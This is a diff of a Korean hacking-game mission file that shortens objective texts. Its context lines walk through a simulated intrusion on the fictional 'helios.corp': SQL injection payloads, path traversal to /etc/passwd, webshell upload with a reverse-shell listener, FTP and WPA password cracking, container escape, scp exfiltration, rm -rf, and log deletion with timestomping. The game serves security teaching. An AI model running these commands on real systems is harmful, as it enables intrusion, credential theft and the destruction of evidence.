@@ -39,7 +39,7 @@
         '0xMOTHER> 터미널의 첫 번째 언어는 둘이야. `ls` — 무엇이 있는지 보는 눈. `cat` — 그것을 펼치는 손.',
         '0xMOTHER> 떨어도 좋다. 멈추지만 마. 그 파일 안에 네 첫 접속 코드가 있다.'
       ].join('\n'),
-      objective: 'readme.txt 안의 ACCESS CODE 를 찾아 `submit <코드>` 하라.',
+      objective: 'ACCESS CODE 를 찾아 `submit <코드>` 하라.',
       steps: [
         '`ls` 를 입력해 지금 디렉터리에 어떤 파일들이 있는지 전체를 파악한다.',
         '목록에서 readme.txt 를 찾아 `cat readme.txt` 로 내용을 화면에 펼친다.',
@@ -64,7 +64,7 @@
         '0xMOTHER> 유닉스에선 이름이 점(.)으로 시작하는 파일은 평범한 목록에서 사라진다. 설정·비밀은 늘 거기 숨어.',
         '0xMOTHER> `ls -a` 의 -a 는 "all". 장막을 통째로 걷어내는 옵션이야. 가려진 걸 의심하는 법부터 배워라.'
       ].join('\n'),
-      objective: '숨겨진 설정파일 .env 의 DB 비밀번호(DB_PASS=값)를 찾아 submit 하라.',
+      objective: '숨겨진 설정에서 DB 비밀번호(DB_PASS=값)를 찾아 submit 하라.',
       steps: [
         '`ls` 로 보이는 파일을 먼저 본 뒤, `ls -a` 로 숨김(점 파일)까지 모두 드러낸다.',
         '새로 나타난 .env 파일을 `cat .env` 로 연다 — 개발자가 흘린 설정의 보고다.',
@@ -89,7 +89,7 @@
         '0xMOTHER> 눈으로 훑을 생각 마라. 해 뜨기 전에 못 끝낸다. `grep` 은 해커의 자석이야 — 원하는 단어가 든 줄만 끌어올린다.',
         '0xMOTHER> "HELIOS" 가 적힌 줄에 내부 DB 서버의 주소가 숨어 있다. 그걸 캐내.'
       ].join('\n'),
-      objective: 'system.log 에서 "HELIOS" 가 든 줄을 찾아, 거기 적힌 내부 DB 호스트 IP를 submit 하라.',
+      objective: '"HELIOS" 단서가 가리키는 내부 DB 호스트 IP를 찾아 submit 하라.',
       steps: [
         '`grep HELIOS system.log` 로 "HELIOS" 라는 단어가 포함된 줄만 추려낸다.',
         '추려진 줄에서 "HELIOS_DB_HOST=" 표기를 찾아, 등호 뒤의 IP 주소를 읽는다.',
@@ -113,7 +113,7 @@
         '0xMOTHER> 유닉스에서 파일에는 읽기(r)·쓰기(w)·실행(x) 세 권한이 붙는다. x 가 없으면 코드여도 돌지 않아.',
         '0xMOTHER> `chmod +x` 로 실행 비트를 세워라. 권한은 곧 주인의 자격이다 — 네가 주인이 될 차례야.'
       ].join('\n'),
-      objective: 'start.sh 에 실행권한을 부여하고 실행(`./start.sh`)하라.',
+      objective: '실행권한이 빠진 정찰 스크립트에 실행권한을 부여하고 실행하라.',
       steps: [
         '`ls -l start.sh` 로 현재 권한을 확인한다 — rw- 만 있고 실행(x) 비트가 없음을 본다.',
         '`chmod +x start.sh` 로 실행 권한을 부여한다.',
@@ -135,7 +135,7 @@
         '0xMOTHER> base64 는 암호화가 아니라 *인코딩* — 데이터를 안전하게 실어 나르려고 갈아입힌 옷일 뿐이야. 키 없이도 누구나 벗긴다.',
         '0xMOTHER> `base64 -d` 로 커튼을 걷어. 안에 관리자 계정 이름이 들어 있다. 암호와 인코딩을 평생 헷갈리지 마라.'
       ].join('\n'),
-      objective: 'cipher.txt 의 base64 를 디코딩해 나온 관리자 계정명을 submit 하라.',
+      objective: 'base64 로 인코딩된 관리자 계정명을 찾아 submit 하라.',
       steps: [
         '`cat cipher.txt` 로 내용을 본다 — 알파벳·숫자·기호가 뒤섞인 전형적인 base64 문자열이다.',
         '`base64 -d cipher.txt` 로 디코딩해 원래 텍스트를 복원한다.',
@@ -156,7 +156,7 @@
         '0xMOTHER> 도메인 네임서버에 "존(zone) 전체를 복사해줘"라고 요청하는 게 AXFR 트랜스퍼야. 제대로 막지 않으면 내부 서브도메인 명단이 통째로 새어나온다.',
         '0xMOTHER> `dig axfr` 로 helios.corp 의 존을 떠라. 밖으로 노출된 *개발용* 서브도메인 하나가 우리의 입구다.'
       ].join('\n'),
-      objective: 'dig 로 helios.corp 의 존을 떠서 노출된 테스트 서브도메인을 찾아 submit 하라.',
+      objective: 'DNS 존 정보에서 노출된 테스트 서브도메인을 찾아 submit 하라.',
       steps: [
         '`dig axfr helios.corp @ns.helios.corp` 로 네임서버에 존 트랜스퍼를 요청한다.',
         '쏟아진 레코드 중 운영용(www, mail)이 아니라 개발/테스트용으로 보이는 dev-* 서브도메인을 찾는다.',
@@ -185,7 +185,7 @@
         '0xMOTHER> `nmap` 은 해커의 청진기야. 대상 호스트의 포트를 하나씩 두드려 열렸는지(open) 닫혔는지 들어준다.',
         '0xMOTHER> 스캔하면 발견한 노드가 우측 네트워크 패널에 그려진다. 그중 *웹(HTTP)* 으로 들어가는 문이 우리 통로다.'
       ].join('\n'),
-      objective: 'nmap 으로 dev-test.helios.corp 를 스캔해, 웹(HTTP) 포트 번호를 submit 하라.',
+      objective: '대상 호스트에서 웹(HTTP) 포트 번호를 찾아 submit 하라.',
       steps: [
         '`nmap dev-test.helios.corp` 로 대상의 열린 포트를 스캔한다.',
         '결과 목록에서 각 포트의 서비스(ftp/ssh/http 등)를 확인하고, http(웹) 서비스가 붙은 포트를 찾는다.',
@@ -208,7 +208,7 @@
         '0xMOTHER> `grep -oE` 의 -o 는 "매칭된 부분만", -E 는 "확장 정규식". 즉 패턴에 맞는 *조각*만 뽑아낸다.',
         '0xMOTHER> @helios.corp 이메일만 추려서 `>` 로 emails.txt 에 저장해. 이 명단이 우리의 첫 무기다.'
       ].join('\n'),
-      objective: 'team.html 에서 @helios.corp 이메일만 추출해 emails.txt 로 저장하라. (grep -oE + 리다이렉션)',
+      objective: '@helios.corp 이메일 주소만 추출해 별도 파일로 저장하라.',
       steps: [
         '`cat team.html` 로 페이지 구조와 이메일이 어떻게 박혀 있는지 먼저 확인한다.',
         '`grep -oE "[a-z.0-9_]+@helios.corp" team.html` 로 이메일 패턴에 맞는 부분만 추출한다.',
@@ -232,7 +232,7 @@
         '0xMOTHER> `nmap -sV` 의 -sV 는 "service Version". 포트가 열린 것만이 아니라, 그 뒤에서 *어떤 소프트웨어의 몇 번 버전*이 도는지까지 알아낸다.',
         '0xMOTHER> 취약점은 버전에 붙어. FTP 서비스의 정확한 버전 문자열을 캐내라.'
       ].join('\n'),
-      objective: 'nmap -sV 로 dev-test.helios.corp 의 FTP 서비스 버전 문자열을 알아내 submit 하라.',
+      objective: '대상 호스트의 FTP 서비스 버전 문자열을 알아내 submit 하라.',
       steps: [
         '`nmap -sV dev-test.helios.corp` 로 각 포트의 서비스 버전까지 식별한다.',
         '결과에서 21/tcp (ftp) 줄을 찾아, VERSION 필드에 적힌 소프트웨어 이름과 버전을 읽는다.',
@@ -259,7 +259,7 @@
         '0xMOTHER> `hydra` 는 사전(wordlist)에 적힌 비번을 하나씩 자동으로 대입하는 무차별 도구야. 낡은 FTP 문에 대고 돌려라.',
         '0xMOTHER> 비번을 찾으면 그 계정으로 `ftp` 접속해. 첫 침투의 맛을 봐.'
       ].join('\n'),
-      objective: 'hydra 로 dev-test(10.0.1.5) 의 ftp 비번을 wordlist.txt 로 알아낸 뒤 ftp 접속하라.',
+      objective: '대상 FTP 계정의 비밀번호를 찾아 접속하라.',
       steps: [
         '`cat wordlist.txt` 로 대입할 후보 비밀번호 목록을 먼저 확인한다.',
         '`hydra 10.0.1.5 ftp wordlist.txt` 로 FTP 서비스에 사전 대입 공격을 실행한다.',
@@ -293,7 +293,7 @@
         '0xMOTHER> 관리자들은 멍청하게도 거기에 *숨기고 싶은 경로*를 적어둬. 막으려던 게 오히려 지도가 되는 거지.',
         '0xMOTHER> `curl` 로 그 robots.txt 를 읽어 Disallow 에 적힌 관리자 경로를 찾아라.'
       ].join('\n'),
-      objective: 'help.helios.corp/robots.txt 를 읽어 Disallow 로 숨겨진 관리자 경로를 submit 하라.',
+      objective: '웹 크롤러 배제 규칙에서 숨겨진 관리자 경로를 찾아 submit 하라.',
       steps: [
         '`curl http://help.helios.corp/robots.txt` 로 로봇 규칙 파일을 받아 읽는다.',
         '여러 Disallow 항목 중, 관리자 페이지로 보이는 경로(admin 류)를 골라낸다.',
@@ -314,7 +314,7 @@
         '0xMOTHER> 로그인 폼은 네 입력을 그대로 SQL 쿼리에 끼워 넣어. 거기에 *항상 참인 조건* 을 주입하면, DB는 비번이 맞다고 착각한다.',
         "0xMOTHER> `login admin \"' OR '1'='1' --\"` — 작은따옴표로 쿼리를 끊고, OR '1'='1' 로 참을 만들고, -- 로 뒷부분을 주석 처리해 무력화하는 거다."
       ].join('\n'),
-      objective: "SQL 인젝션으로 인증을 우회 로그인하라. (login admin \"' OR '1'='1' --\")",
+      objective: 'SQL 인젝션으로 인증을 우회 로그인하라.',
       steps: [
         '로그인 입력이 따옴표로 감싼 SQL 문자열에 그대로 들어간다는 점을 이해한다.',
         "비밀번호 자리에 `' OR '1'='1'` 같은 항상 참(True)인 조건을 주입해 인증 논리를 무너뜨린다.",
@@ -333,7 +333,7 @@
         '0xMOTHER> UNION 인젝션은 원래 쿼리 결과 뒤에 *다른 테이블의 결과를 이어 붙이는* 기술이야. 컬럼 수만 맞추면 users 테이블을 화면에 끌어낼 수 있다.',
         "0xMOTHER> `login admin \"' UNION SELECT null,user,pass FROM users --\"` — 관리자 해시까지 통째로 뽑아내."
       ].join('\n'),
-      objective: 'UNION 기반 인젝션으로 users 테이블의 자격증명을 덤프하라.',
+      objective: 'UNION 기반 인젝션으로 사용자 자격증명을 덤프하라.',
       steps: [
         '원래 쿼리가 몇 개의 컬럼을 반환하는지 가늠하고, 그 수에 맞춰 UNION SELECT 절을 구성한다.',
         "`login admin \"' UNION SELECT null,user,pass FROM users --\"` 로 users 테이블의 계정·비밀번호 컬럼을 결과에 이어 붙인다.",
@@ -354,7 +354,7 @@
         '0xMOTHER> `../` 는 "상위 폴더로" 라는 뜻이야. 이걸 충분히 반복하면 웹 폴더를 빠져나와 시스템 루트까지 거슬러 올라간다 — 경로 조작(Path Traversal/LFI).',
         '0xMOTHER> 유닉스의 심장 `/etc/passwd` 를 읽어내. 서버가 자기 비밀을 스스로 뱉게 만드는 거다.'
       ].join('\n'),
-      objective: '경로 조작(LFI)으로 /etc/passwd 를 읽어내라. (curl ...?file=../../../../etc/passwd)',
+      objective: '경로 조작(LFI)으로 시스템 사용자 목록을 읽어내라.',
       steps: [
         '다운로드 기능이 ?file= 파라미터로 읽을 파일을 지정한다는 점을 파악한다.',
         '`../` 를 여러 번 쌓아 웹 루트를 탈출하도록 경로를 구성한다.',
@@ -381,7 +381,7 @@
         '0xMOTHER> 패킷 안에는 그가 보낸 세션 쿠키가 평문으로 흐르고 있어 — 그걸 훔치면 그의 로그인을 그대로 도용할 수 있다.',
         '0xMOTHER> `tcpdump -r capture.pcap Cookie` 로 쿠키가 든 줄만 추려내. ORACLE이 따라오기 전에.'
       ].join('\n'),
-      objective: 'capture.pcap 에서 관리자 세션 쿠키 값(SESSION=...)을 가로채 submit 하라.',
+      objective: '패킷 캡처에서 관리자 세션 쿠키 값(SESSION=...)을 찾아 submit 하라.',
       steps: [
         '`tcpdump -r capture.pcap Cookie` 로 저장된 패킷 중 Cookie 헤더가 든 줄만 필터링한다.',
         '추려진 줄에서 "SESSION=" 뒤에 붙은 세션 토큰 값을 찾는다.',
@@ -405,7 +405,7 @@
         '0xMOTHER> 프로필 이미지 업로드 창이 보이지? 그 검증이 허술해서 .php 같은 실행 파일도 통과돼. 그게 *웹쉘*이다 — 서버 위에서 명령을 실행시켜 주는 뒷문.',
         '0xMOTHER> `curl -X POST -F file=@shell.php` 로 위장한 웹쉘을 업로드 엔드포인트에 던져 넣어.'
       ].join('\n'),
-      objective: '파일 업로드 검증을 우회해 웹쉘(shell.php)을 /upload 에 올려라.',
+      objective: '파일 업로드 검증을 우회해 웹쉘을 업로드하라.',
       steps: [
         '`cat shell.php` 로 업로드할 웹쉘의 정체(명령 실행 코드)를 확인한다.',
         '업로드 기능이 확장자·내용 검증을 제대로 하지 않는다는 점을 이용한다.',
@@ -428,7 +428,7 @@
         '0xMOTHER> 방화벽은 들어오는 연결은 막아도 나가는 연결은 잘 안 막아. 그래서 서버가 먼저 우리에게 전화를 걸게 만드는 거지.',
         '0xMOTHER> 먼저 `nc -lvnp 4444` 로 전화를 받을 리스너를 열고, 그다음 웹쉘 URL을 호출해 콜백을 유도해.'
       ].join('\n'),
-      objective: 'nc 리스너를 열고 웹쉘을 트리거해 리버스 쉘로 내부망 거점을 확보하라.',
+      objective: '웹쉘을 통해 리버스 쉘을 받아 내부망 거점을 확보하라.',
       steps: [
         '`nc -lvnp 4444` 로 들어올 리버스 연결을 받을 리스너를 먼저 연다.',
         '`curl http://help.helios.corp/uploads/shell.php` 로 심어둔 웹쉘을 실행시킨다.',
@@ -463,7 +463,7 @@
         ],
         foot: '[ 채널 종료 · 연락처에 WRAITH 추가됨 — `channel wraith` ]'
       },
-      objective: 'WRAITH가 남긴 /tmp/gift.sh 의 내용을 확인(cat)하라. (실행은 신뢰가 아니다)',
+      objective: 'WRAITH가 남긴 선물의 내용을 확인하라. 실행은 신뢰가 아니다.',
       steps: [
         '`ls -l /tmp/gift.sh` 로 그 파일의 권한과 소유자(wraith)를 먼저 확인한다.',
         '절대 실행하지 말고, `cat /tmp/gift.sh` 로 내용만 열어 무엇을 하는 스크립트인지 읽는다.',
@@ -513,7 +513,7 @@
         '0xMOTHER> 지름길은 흔적을 남겨. runner 바이너리 안에 root 비번이 박혀 있다(`strings`). 그걸 읽어 정공법으로 `su root` 해라.',
         '[ 두 길이 갈린다 — 어느 쪽을 택하느냐가 네 성향(STANCE)을 정한다 ]'
       ].join('\n'),
-      objective: 'root 권한을 획득하라 — WRAITH의 크론 백도어 또는 0xMOTHER의 정공법(strings→su).',
+      objective: 'root 권한을 획득하라. 선택한 방식이 성향에 반영된다.',
       steps: [
         '【공통】 두 길 중 하나만 완수하면 root 가 된다. 선택이 엔딩 성향을 가른다는 점을 기억한다.',
         '【0xMOTHER · 신념】 `strings /usr/bin/runner` 로 바이너리 속 문자열에서 ROOT_PW 값을 찾아, `su root <비번>` 으로 정정당당히 승격한다.',
@@ -547,7 +547,7 @@
         '0xMOTHER> HELIOS 코어를 지키는 인증 데몬 — helios_auth_daemon — 이 이 호스트 어딘가에서 돌고 있다. 그게 왕국의 자물쇠야.',
         '0xMOTHER> `find / -name helios_auth_daemon` 으로 그 위치를 짚어내.'
       ].join('\n'),
-      objective: 'root 권한으로 코어 인증 데몬(helios_auth_daemon)의 전체 경로를 찾아 submit 하라.',
+      objective: 'root 권한으로 코어 인증 데몬의 전체 경로를 찾아 submit 하라.',
       steps: [
         '`find / -name helios_auth_daemon` 으로 이름이 정확히 일치하는 파일을 시스템 전역에서 검색한다.',
         '검색 결과로 나온 전체 경로(예: /opt/core/...)를 확인한다.',
@@ -573,7 +573,7 @@
         '0xMOTHER> 그들은 편하려고 마스터 키 같은 비밀을 코드 안에 *그냥 문자열로* 박아두곤 해. 컴파일된 바이너리에도 그 글자들은 그대로 남아 있어.',
         '0xMOTHER> `strings` 는 바이너리에서 사람이 읽을 수 있는 문자열만 뽑아내. 거기서 MASTER_KEY 를 캐내라.'
       ].join('\n'),
-      objective: 'helios_auth_daemon 에서 하드코딩된 마스터 키(MASTER_KEY=값)를 추출해 submit 하라.',
+      objective: '하드코딩된 마스터 키(MASTER_KEY=값)를 추출해 submit 하라.',
       steps: [
         '`strings /opt/core/helios_auth_daemon` 으로 바이너리 속 읽을 수 있는 문자열을 전부 뽑는다.',
         '쏟아진 문자열 중 "MASTER_KEY=" 로 시작하는 줄을 찾는다.',
@@ -598,7 +598,7 @@
         '0xMOTHER> 무차별로 풀 순 없지만, 비번은 분명 회사 비밀번호 규정을 따를 거야. 사전 공격이 통한다는 뜻이지.',
         '0xMOTHER> `zip2john` 으로 zip 의 비번 해시를 뽑아내고, `john` 으로 사전(rockyou)을 돌려 크랙해.'
       ].join('\n'),
-      objective: 'data.zip 의 압축 비밀번호를 zip2john→john 으로 크랙해 submit 하라.',
+      objective: '암호화된 압축 파일의 비밀번호를 크랙해 submit 하라.',
       steps: [
         '`zip2john data.zip > hash.txt` 로 암호 zip 에서 크랙 가능한 해시를 추출해 파일로 저장한다.',
         '`john --wordlist=rockyou.txt hash.txt` 로 사전 단어를 대입해 비밀번호를 크랙한다.',
@@ -621,7 +621,7 @@
         'WRAITH> 무작정 풀려다 도구를 잘못 고르면 깨져. `file` 로 매 겹의 *실제 형식*을 먼저 확인하고, 그에 맞는 해제 도구를 써.',
         'WRAITH> 폭탄 해체하듯 한 겹씩. bz2 → tar → gz 순서로 벗겨내.'
       ].join('\n'),
-      objective: '중첩 압축된 payload 를 끝까지 해제하라. (bunzip2 → tar → gunzip)',
+      objective: '중첩 압축된 데이터를 끝까지 해제하라.',
       steps: [
         '`file payload.bz2` 로 첫 겹의 실제 형식(bzip2)을 확인한다.',
         '`bunzip2 payload.bz2` 로 첫 겹을 풀고, 나온 파일을 다시 `file` 로 확인한다(tar).',
@@ -647,7 +647,7 @@
         '0xMOTHER> 스테가노그래피야. 암호화와 달리 *존재 자체를 숨기는* 기술이지. 그림의 픽셀 속에 메시지를 몰래 박아 넣는다.',
         '0xMOTHER> `steghide extract -sf cover.jpg` 로 숨은 데이터를 뽑아내. 블랙리스트 DB를 여는 마지막 키가 거기 있다.'
       ].join('\n'),
-      objective: 'cover.jpg 에 숨겨진 데이터를 추출해, 안의 블랙리스트 키를 submit 하라.',
+      objective: '은닉된 데이터에서 블랙리스트 키를 추출해 submit 하라.',
       steps: [
         '`steghide extract -sf cover.jpg` 로 이미지에 은닉된 데이터를 추출한다.',
         '추출되어 나온 hidden.txt 를 `cat hidden.txt` 로 연다.',
@@ -675,7 +675,7 @@
         '0xMOTHER> 보존해. 그 사람들을 위해: `scp blacklist.db me@10.0.0.42:/tmp/`',
         '[ 돌이킬 수 없는 선택 — 신뢰의 향방이 갈린다 ]'
       ].join('\n'),
-      objective: 'blacklist.db 를 파괴(rm)하거나 보존(scp)하라. 선택이 엔딩을 가른다.',
+      objective: '블랙리스트 데이터를 파괴하거나 보존하라. 선택이 엔딩을 가른다.',
       steps: [
         '`cat blacklist.db` 로 명단의 내용과 그 무게(0xMOTHER의 정체·감시 대상자들)를 직접 확인한다.',
         '【WRAITH · 효율/불신】 `rm -rf blacklist.db` 로 명단을 영구 파괴한다 — 증거도 사라진다.',
@@ -706,7 +706,7 @@
         '0xMOTHER> 평소 무선 카드는 자기 앞으로 온 패킷만 받지만, 모니터 모드는 공기 중 모든 신호를 엿듣게 해줘 — 스니핑의 전제 조건이지.',
         '0xMOTHER> `airmon-ng start wlan0` — 사냥의 준비다.'
       ].join('\n'),
-      objective: '무선카드를 모니터 모드로 전환하라. (airmon-ng start wlan0)',
+      objective: '무선카드를 모니터 모드로 전환하라.',
       steps: [
         '`airmon-ng start wlan0` 로 무선 인터페이스를 모니터 모드로 전환한다.',
         '인터페이스 이름이 wlan0 에서 wlan0mon 으로 바뀌었는지 출력으로 확인한다.',
@@ -724,7 +724,7 @@
         '0xMOTHER> 화면엔 여러 네트워크가 뜰 거야 — 게스트망, 카페 공유기… 우리가 노리는 건 클라이언트가 붙어 있는 *코어 운영망* WPA2 AP다.',
         '0xMOTHER> 클라이언트가 붙어 있어야 다음 단계(핸드셰이크 캡처)가 가능해. 그 SSID를 찾아라.'
       ].join('\n'),
-      objective: 'airodump 로 주변 AP를 스캔해, HELIOS 코어 운영망의 SSID를 찾아 submit 하라.',
+      objective: '주변 AP에서 HELIOS 코어 운영망의 SSID를 찾아 submit 하라.',
       steps: [
         '먼저 `airmon-ng start wlan0` 로 모니터 모드를 확인/활성화한다.',
         '`airodump-ng wlan0mon` 로 주변 무선 AP 목록(ESSID·암호화·클라이언트 수)을 스캔한다.',
@@ -750,7 +750,7 @@
         'WRAITH> deauth 패킷은 "너 연결 끊겼어"라고 속이는 거짓 신호야. 내부자를 한 번 떨궈내면, 자동으로 재접속하면서 WPA 핸드셰이크를 흘린다 — 그걸 낚아채.',
         'WRAITH> `aireplay-ng -0 10 -a <BSSID> wlan0mon` 으로 끊고, 캡처한 핸드셰이크를 `aircrack-ng -w` 사전으로 깨.'
       ].join('\n'),
-      objective: 'deauth로 핸드셰이크를 캡처하고 aircrack 으로 HELIOS-CORE-OPS 의 WPA 키를 크랙해 submit 하라.',
+      objective: '핸드셰이크를 캡처하고 코어 운영망의 WPA 키를 크랙해 submit 하라.',
       steps: [
         'airmon → airodump 로 타깃 AP(HELIOS-CORE-OPS)의 BSSID 와 채널을 확인한다.',
         '`aireplay-ng -0 10 -a DE:AD:C0:DE:13:37 wlan0mon` 로 deauth 패킷을 보내 클라이언트를 강제로 끊는다.',
@@ -773,7 +773,7 @@
         '0xMOTHER> …`.dockerenv` 가 보이지? 우린 진짜 코어가 아니라 *도커 컨테이너 함정* 안에 갇혔어. 격리된 모래상자야 — 여기서 뭘 부숴도 진짜 시스템엔 안 닿아.',
         '0xMOTHER> 하지만 설정이 허술하면 탈출구가 있어. 호스트의 진짜 디스크를 마운트해서 그 위로 `chroot` 해 빠져나가.'
       ].join('\n'),
-      objective: '컨테이너를 탈출하라. (mount 로 호스트 디스크 → chroot)',
+      objective: '컨테이너를 탈출해 호스트 환경으로 이동하라.',
       steps: [
         '`ls -la /` 로 루트를 살펴 `.dockerenv` 등 컨테이너에 갇혔다는 흔적을 확인한다.',
         '`mount /dev/sda1 /mnt` 로 호스트의 실제 디스크를 컨테이너 안 /mnt 에 연결한다.',
@@ -795,7 +795,7 @@
         '0xMOTHER> 대신 우리가 점령한 이 점프박스를 *징검다리*로 쓴다. SSH 포트 포워딩(-L)은 내 로컬 포트를, 점프박스를 거쳐, 분리망의 목적지까지 잇는 비밀 터널을 뚫어줘.',
         '0xMOTHER> `ssh -L 8080:10.0.0.1:80 admin@10.0.1.1` — 내 8080 포트가 곧 코어 DB의 문이 된다.'
       ].join('\n'),
-      objective: 'SSH 포트포워딩으로 분리망의 코어 DB(10.0.0.1)로 가는 터널을 뚫어라.',
+      objective: 'SSH 포트포워딩으로 분리망의 코어 DB로 가는 터널을 뚫어라.',
       steps: [
         '점프호스트 자격증명(admin@10.0.1.1, 비번 jump_2024)을 확인한다.',
         '`ssh -L 8080:10.0.0.1:80 admin@10.0.1.1 jump_2024` 로 로컬 8080 → 점프박스 → 코어 DB(10.0.0.1:80) 터널을 연다.',
@@ -819,7 +819,7 @@
         '0xMOTHER> `sed -i` 의 -i 는 "in-place", 즉 파일을 직접 고친다. `/패턴/d` 는 "그 패턴이 든 줄을 삭제"하라는 명령이야.',
         '0xMOTHER> `sed -i \'/10.0.0.42/d\' /var/log/syslog` — 네 흔적을 단 한 줄도 남기지 마.'
       ].join('\n'),
-      objective: 'syslog 에서 네 IP(10.0.0.42)가 찍힌 모든 줄을 sed 로 삭제하라.',
+      objective: '로그에서 네 접속 흔적이 찍힌 모든 줄을 삭제하라.',
       steps: [
         '`grep 10.0.0.42 /var/log/syslog` 로 네 IP가 찍힌 줄이 몇 개나 있는지 먼저 확인한다.',
         "`sed -i '/10.0.0.42/d' /var/log/syslog` 로 해당 패턴이 든 모든 줄을 파일에서 직접 삭제한다.",
@@ -844,7 +844,7 @@
         'WRAITH> 네가 방금 syslog를 수정한 시각이 그대로 메타데이터에 박혀 있어. 그 자체가 증거지.',
         'WRAITH> `touch -t` 로 파일의 수정 시간을 한참 과거로 돌려놔. 시간을 뒤틀면 수사관은 유령을 쫓게 돼.'
       ].join('\n'),
-      objective: 'syslog 의 타임스탬프를 과거로 변조(타임스톰핑)하라. (touch -t)',
+      objective: '로그의 타임스탬프를 과거로 변조하라.',
       steps: [
         '`touch -t` 의 시간 형식이 YYYYMMDDhhmm (연월일시분) 임을 이해한다.',
         '`touch -t 202501010000 /var/log/syslog` 로 수정 시각을 한참 과거(예: 1년 전)로 변조한다.',
@@ -871,7 +871,7 @@
         '0xMOTHER> `systemctl poweroff -f` — 강제 종료. 망설임은 없어.',
         '0xMOTHER> 네가 어떤 사람이 될지는, 이 문을 연 다음 결정된다. 지금까지의 모든 선택이 그 답을 적어왔어.'
       ].join('\n'),
-      objective: 'HELIOS 코어를 강제 종료해 작전을 끝내라. (systemctl poweroff)',
+      objective: 'HELIOS 코어를 강제 종료해 작전을 끝내라.',
       steps: [
         '이 명령이 되돌릴 수 없으며, 그동안 쌓은 STANCE(신념 vs 효율)가 엔딩을 결정한다는 점을 인지한다.',
         '`systemctl poweroff -f` 로 HELIOS 코어를 강제 종료한다.',
